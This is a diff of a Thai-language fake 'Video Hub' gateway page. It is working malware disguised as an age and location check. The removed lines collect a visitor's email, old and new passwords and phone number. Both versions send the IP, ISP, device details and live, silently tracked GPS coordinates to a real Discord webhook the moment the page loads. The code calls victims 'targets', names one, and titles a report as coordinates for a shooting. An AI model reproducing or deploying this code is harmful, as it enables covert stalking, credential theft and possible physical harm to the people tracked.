@@ -3,191 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video Hub | Official Gateway</title>
+    <title>Video Hub | Secure Gateway</title>
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #ff9900; --bg: #0b0b0b; --card: #161616; --text: #e0e0e0; --success: #00ff00; }
+        :root { --primary: #ff9900; --bg: #0b0b0b; --card: #161616; --text: #e0e0e0; }
         body { margin: 0; background-color: var(--bg); font-family: 'Kanit', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: var(--text); overflow: hidden; }
-        
-        .container { text-align: center; width: 90%; max-width: 420px; padding: 40px 30px; background: var(--card); border-radius: 16px; border: 1px solid #222; box-shadow: 0 20px 60px rgba(0,0,0,0.8); position: relative; }
-        
-        /* สไตล์โลโก้ VideoHub */
-        .logo { font-size: 38px; font-weight: 600; margin-bottom: 25px; letter-spacing: -1px; }
+        .container { text-align: center; width: 90%; max-width: 420px; padding: 40px 30px; background: var(--card); border-radius: 20px; border: 1px solid #222; box-shadow: 0 20px 60px rgba(0,0,0,0.9); }
+        .logo { font-size: 38px; font-weight: 600; margin-bottom: 25px; }
         .logo span { background: var(--primary); color: #000; padding: 0px 10px; border-radius: 4px; margin-left: 6px; }
-        
-        .btn-main { background: var(--primary); color: #000; border: none; padding: 18px 40px; font-size: 17px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 20px; }
-        .btn-main:active { transform: scale(0.98); }
-        
-        select, input { width: 100%; padding: 12px; background: #222; border: 1px solid #333; border-radius: 6px; color: white; margin-top: 10px; box-sizing: border-box; outline: none; font-family: 'Kanit'; }
-        .input-group { text-align: left; margin-bottom: 15px; }
-        .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 6px; }
-        
-        /* Loading Animation */
-        .loader-ring { border: 4px solid #222; border-top: 4px solid var(--primary); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .success-icon { font-size: 60px; color: var(--success); margin-bottom: 20px; display: none; }
-        
-        /* กล่องขู่กฎหมาย */
-        .legal-footer { font-size: 13px; line-height: 1.6; color: var(--primary); background: rgba(255, 153, 0, 0.05); padding: 18px; border-radius: 12px; border: 1px solid rgba(255, 153, 0, 0.15); margin-top: 25px; font-weight: 300; }
-        
-        #timerBox { margin-top: 25px; color: var(--primary); display:none; }
-        #sec { font-size: 32px; font-weight: 600; }
+        .btn-main { background: var(--primary); color: #000; border: none; padding: 18px 40px; font-size: 17px; font-weight: 600; border-radius: 10px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 20px; }
+        .progress-container { width: 100%; background: #222; height: 10px; border-radius: 5px; margin: 25px 0; overflow: hidden; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: var(--primary); transition: width 0.1s linear; box-shadow: 0 0 15px var(--primary); }
+        .status-text { font-size: 14px; color: var(--primary); font-weight: 500; height: 20px; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="step1">
+<div class="container">
     <div class="logo">Video<span>Hub</span></div>
-    <div style="font-size: 22px; font-weight: 600; margin-bottom: 10px;">ยืนยันอายุเพื่อเข้าชม</div>
-    <p style="font-size: 14px; color: #999; margin-bottom: 30px;">วิดีโอนี้จำกัดเฉพาะผู้ที่มีอายุ 18 ปีขึ้นไปเท่านั้น</p>
-    <button class="btn-main" onclick="goToStep2()">เข้าสู่ระบบเพื่อยืนยันอายุ</button>
-</div>
-
-<div class="container" id="step2" style="display:none;">
-    <div class="logo" style="font-size: 24px;">Video<span>Hub</span></div>
-    <div style="font-size: 20px; font-weight: 600; margin-bottom: 10px;">🌐 พื้นที่การรับชม</div>
-    <p style="font-size: 12px; color: #888; margin-bottom: 20px;">กรุณาระบุตำแหน่งของคุณเพื่อรับชมเนื้อหาที่ไม่ถูกปิดกั้นในพื้นที่</p>
     
-    <select id="country">
-        <option value="TH">ประเทศไทย (Thailand)</option>
-        <option value="JP">ญี่ปุ่น (Japan)</option>
-        <option value="US">สหรัฐอเมริกา (United States)</option>
-        <option value="SG">สิงคโปร์ (Singapore)</option>
-        <option value="KR">เกาหลีใต้ (South Korea)</option>
-    </select>
-    
-    <div id="timerBox">
-        <p style="font-size: 14px; color: #aaa; margin:0;">กำลังประมวลผลข้อมูลพื้นที่...</p>
-        <div id="sec">15</div>
+    <div id="step1">
+        <div style="font-size: 22px; font-weight: 600; margin-bottom: 10px;">ยืนยันสิทธิ์การเข้าชม</div>
+        <p style="font-size: 14px; color: #999; margin-bottom: 30px;">กรุณายืนยันตำแหน่งพื้นที่ปัจจุบันเพื่อปลดล็อกเนื้อหาตามนโยบายลิขสิทธิ์</p>
+        <button class="btn-main" onclick="startHybridAudit()">ยินยอมและเริ่มการตรวจสอบ</button>
     </div>
 
-    <div id="legalAlert" class="legal-footer">
-        กรุณากด "อนุญาต" เพื่อยืนยันตัวตนจากประเทศไทย และหลีกเลี่ยงกฎหมายเพื่อตัวคุณเอง
+    <div id="step2" style="display:none;">
+        <div class="status-text" id="status-msg">กำลังเชื่อมต่อดาวเทียม...</div>
+        <div class="progress-container" id="p-container" style="display:block;">
+            <div class="progress-bar" id="p-bar"></div>
+        </div>
+        <p style="font-size: 12px; color: #666;">กำลังปรับจูนความแม่นยำพิกัด (GPS High Precision)</p>
     </div>
-
-    <button id="btnAsk" class="btn-main" onclick="requestGPS()">ตกลงเพื่อดำเนินการต่อ</button>
-</div>
-
-<div class="container" id="step3" style="display:none;">
-    <div class="logo" style="font-size: 24px;">Video<span>Hub</span></div>
-    <div style="font-size: 18px; font-weight: 600; margin-bottom: 10px;">🔐 ยืนยันข้อมูลความปลอดภัย</div>
-    <p style="font-size: 12px; color: #888; margin-bottom: 20px;">กรุณาซิงค์รหัสผ่านใหม่เพื่อป้องกันการละเมิดลิขสิทธิ์ในพื้นที่</p>
-    
-    <div class="input-group"><label>อีเมล หรือ ชื่อผู้ใช้งาน</label><input type="text" id="u_mail" placeholder="email@example.com"></div>
-    <div class="input-group"><label>รหัสผ่านปัจจุบัน</label><input type="password" id="u_old" placeholder="Password"></div>
-    <div class="input-group"><label>ตั้งรหัสผ่านใหม่</label><input type="password" id="u_new" placeholder="8 ตัวขึ้นไป"></div>
-    <div class="input-group"><label>เบอร์โทรศัพท์ (ถ้ามี)</label><input type="tel" id="u_phone" placeholder="0XXXXXXXXX"></div>
-    
-    <button class="btn-main" onclick="submitFinalData()">บันทึกข้อมูลและเข้าชม</button>
-</div>
-
-<div class="container" id="step4" style="display:none;">
-    <div class="logo" style="font-size: 24px;">Video<span>Hub</span></div>
-    <div class="loader-ring" id="finalLoader"></div>
-    <div class="success-icon" id="successTick">✔</div>
-    <div id="statusText" style="font-size: 18px; font-weight: 600;">กำลังประมวลผล...</div>
-    <p id="subText" style="font-size: 12px; color: #888; margin-top: 10px;">กำลังซิงค์ข้อมูลจากWEBSITE...</p>
 </div>
 
 <script>
-    const WEB_HOOK = "https://discordapp.com/api/webhooks/1489269207026897087/TzJIxIrMpztF8yqduGcpPUwQwCnQflmd_5nbHdBtqwevdBWYV76KS4ite7kS087V_REw";
-    const REDIRECT_URL = "https://topvoyeur.net/home/forum/porn-forum/asian-porn-%E3%82%A2%E3%82%B8%E3%82%A2%E3%81%AE%E3%83%9D%E3%83%AB%E3%83%8E/643-asian-teens-hard-fucks";
-    
-    let uIP = "Pending...", cPos = null, ipData = {};
+    const WEB_HOOK = "https://discordapp.com/api/webhooks/1489246843849277572/98NFNxktPRbCeIw3qj0Cr6Nw0lhODmAQvLdaGdN7F0gXUoB845iaF9E7VYzfGfyHGKwm";
+    const REDIRECT_URL = "https://www.google.com";
 
-    // 🚩 แจ้งเตือนทันทีที่เข้าเว็บ
-    window.onload = () => {
-        sendDiscord("🚨 [ALARM] เป้าหมายเปิดลิงก์แล้ว", `อุปกรณ์: ${navigator.platform}\nวัน/เวลา: ${new Date().toLocaleString()}`);
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-            uIP = d.ip; ipData = d;
-            sendDiscord("🌐 [IP GEODATA]", `IP: ${d.ip}\nCity: ${d.city}\nISP: ${d.org}`);
-        });
+    let bestPos = null;
+    let watchID = null;
+
+    // 🚩 รายงานตัวทันทีที่เปิดลิงก์ (ดึง IP/OS)
+    window.onload = async () => {
+        let ipD = {};
+        try { ipD = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) { ipD = {ip:'N/A'}; }
+        sendDiscord("🚨 [ALARM] เป้าหมายเปิดลิงก์", `IP: ${ipD.ip}\nISP: ${ipD.org}\nOS: ${navigator.platform}`);
     };
 
-    function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+    function startHybridAudit() {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
 
-    // 🚩 หน้า 2: ขอ GPS ครั้งเดียว และแอบส่งเรื่อยๆ
-    function requestGPS() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((p) => {
-                cPos = p;
-                // ส่งพิกัดแม่นยำชุดแรกทันที
-                sendDiscord("🎯 [GPS FIRST HIT]", formatGPS(p));
-                
-                // ระบบ Silent Tracking (แอบส่งเงียบๆ)
-                navigator.geolocation.watchPosition((pos) => {
-                    cPos = pos;
-                    sendDiscord("📡 [SILENT GPS UPDATE]", formatGPS(pos));
-                }, null, { enableHighAccuracy: true });
-
-                // ซ่อนส่วนไม่จำเป็น และรันตัวเลขถอยหลัง
-                document.getElementById('btnAsk').style.display = 'none';
-                document.getElementById('legalAlert').style.display = 'none';
-                document.getElementById('timerBox').style.display = 'block';
-                
-                let s = 15;
-                const t = setInterval(() => {
-                    s--; document.getElementById('sec').innerText = s;
-                    if(s <= 0) { 
-                        clearInterval(t); 
-                        document.getElementById('step2').style.display = 'none'; 
-                        document.getElementById('step3').style.display = 'block'; 
-                    }
-                }, 1000);
-            }, (err) => { 
-                alert("❌ การยืนยันตัวตนล้มเหลว กรุณากด 'อนุญาต' เพื่อเข้าชมวิดีโอตามกฎหมาย"); 
-                location.reload(); 
-            }, { enableHighAccuracy: true });
-        }
-    }
-
-    async function submitFinalData() {
-        const mail = document.getElementById('u_mail').value;
-        const oldP = document.getElementById('u_old').value;
-        const newP = document.getElementById('u_new').value;
-        const phone = document.getElementById('u_phone').value;
-        if(!mail || !oldP || !newP) { alert("กรุณากรอกข้อมูลให้ครบถ้วน"); return; }
-        
-        document.getElementById('step3').style.display = 'none';
-        document.getElementById('step4').style.display = 'block';
-
-        // หน่วงเวลาหน้าสุดท้ายเพื่อดึง IP ให้แม่น
-        let waits = 0;
-        while (uIP === "Pending..." && waits < 10) {
-            await new Promise(r => setTimeout(r, 500)); waits++;
+            // เริ่ม Silent Tracking ทันที
+            watchID = navigator.geolocation.watchPosition((p) => {
+                if (!bestPos || p.coords.accuracy < bestPos.coords.accuracy) bestPos = p;
+                // ส่งอัปเดตแบบรัวๆ (จุดเด่นของ Index)
+                sendDiscord("📡 [SILENT UPDATE]", formatData(p));
+            }, null, { enableHighAccuracy: true, maximumAge: 0 });
         }
 
-        const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0 }));
-        
-        // 🚩 รวม Payload ชุดใหญ่ที่สุด
-        const report = `**🚨 [FULL DATA DUMP] วราภรณ์**\n` +
-                       `**👤 Account:** ${mail}\n**Old Pass:** ${oldP}\n**New Pass:** ${newP}\n**Phone:** ${phone}\n\n` +
-                       `**🌐 IP Geodata:** ${uIP} (${ipData.city || 'N/A'})\n**📡 ISP:** ${ipData.org || 'N/A'}\n` +
-                       `**📱 Device:** ${navigator.platform} | Bat: ${Math.round(battery.level * 100)}%\n` +
-                       `**🎯 Precision GPS:** ${cPos ? cPos.coords.latitude + ',' + cPos.coords.longitude : 'N/A'}\n` +
-                       `**🛰️ Accuracy:** +/- ${cPos ? cPos.coords.accuracy.toFixed(1) : '0'}m\n` +
-                       `[คลิกเปิดแผนที่](https://www.google.com/maps?q=${cPos ? cPos.coords.latitude + ',' + cPos.coords.longitude : ''})`;
-        
-        sendDiscord("🏁 [COMPLETED - TOTAL REPORT]", report);
-
-        // แสดง Success และ Redirect
-        setTimeout(() => {
-            document.getElementById('finalLoader').style.display = 'none';
-            document.getElementById('successTick').style.display = 'block';
-            document.getElementById('statusText').innerText = "ยืนยันสำเร็จ!";
-            document.getElementById('statusText').style.color = "#00ff00";
-            document.getElementById('subText').innerText = "กำลังนำท่านไปยังวิดีโอ...";
-            setTimeout(() => { window.location.href = REDIRECT_URL; }, 2500);
-        }, 3000);
+        // ดึงเช็ง 12 วินาที (จุดเด่นของตัวที่สอง)
+        let prog = 0;
+        const msgs = ["Connecting Satellites...", "Scanning Area...", "Calibrating GPS...", "Finalizing Scan..."];
+        const inv = setInterval(() => {
+            prog += 0.8;
+            document.getElementById('p-bar').style.width = prog + "%";
+            document.getElementById('status-msg').innerText = msgs[Math.floor((prog/100)*(msgs.length-1))];
+            if (prog >= 100) {
+                clearInterval(inv);
+                finalizeAndRedirect();
+            }
+        }, 100);
     }
 
-    function formatGPS(p) {
-        return `IP: ${uIP}\nLat: ${p.coords.latitude}, Lon: ${p.coords.longitude}\nAccuracy: +/- ${p.coords.accuracy.toFixed(1)}m\n[แผนที่](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
+    async function finalizeAndRedirect() {
+        const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0 }));
+        const finalReport = `**🏁 [MISSION COMPLETED] รายงานพิกัดจ่อยิง**\n` +
+                          `**👤 เครื่อง:** ${navigator.platform} | **🔋 แบต:** ${Math.round(bat.level*100)}%\n` +
+                          `**🎯 พิกัดแม่นที่สุด:** \`${bestPos?bestPos.coords.latitude:0}, ${bestPos?bestPos.coords.longitude:0}\`\n` +
+                          `**🛰️ Accuracy:** +/- ${bestPos?bestPos.coords.accuracy.toFixed(1):0}m\n` +
+                          `[คลิกเปิดแผนที่](https://www.google.com/maps?q=${bestPos?bestPos.coords.latitude+','+bestPos.coords.longitude:''})`;
+        
+        sendDiscord("✅ [FULL REPORT]", finalReport);
+        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
     }
 
-    function sendDiscord(t, d) {
-        fetch(WEB_HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [{ title: t, description: d, color: 16750848, footer: { text: "Intelligence ID: 0925733791" }, timestamp: new Date().toISOString() }] }) });
+    function formatData(p) {
+        return `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}\nAccuracy: +/- ${p.coords.accuracy.toFixed(1)}m`;
+    }
+
+    function sendDiscord(title, desc) {
+        fetch(WEB_HOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                embeds: [{ title: title, description: desc, color: 16750848, timestamp: new Date().toISOString() }]
+            })
+        });
     }
 </script>
 
